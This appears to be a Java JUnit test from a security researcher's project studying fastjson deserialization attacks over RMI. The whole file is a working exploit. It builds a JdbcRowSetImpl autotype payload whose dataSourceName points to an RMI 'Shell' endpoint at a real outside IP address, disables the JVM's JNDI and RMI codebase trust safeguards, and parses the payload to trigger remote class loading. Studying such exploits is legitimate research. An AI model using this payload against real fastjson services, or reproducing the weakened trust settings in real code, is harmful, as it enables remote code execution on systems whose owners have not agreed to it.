package com.pinger.javasec;

import com.alibaba.fastjson.JSON;
import org.junit.jupiter.api.Test;

/**
 * @author : p1n93r
 * @date : 2021/3/30 16:28
 * fastjson利用rmi进行攻击的一些测试
 * 主要是研究codebase的影响
 */
public class FastJsonSecTest {

    @Test
    public void test1(){
        String json="{\n" +
                "  \"b\": {\n" +
                "    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n" +
                "    \"dataSourceName\": \"rmi://49.234.105.98:1099/Shell\",\n" +
                "    \"autoCommit\": true\n" +
                "  }\n" +
                "}";

        // 第一个不是必要的
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        Object parse = JSON.parse(json);
    }








}
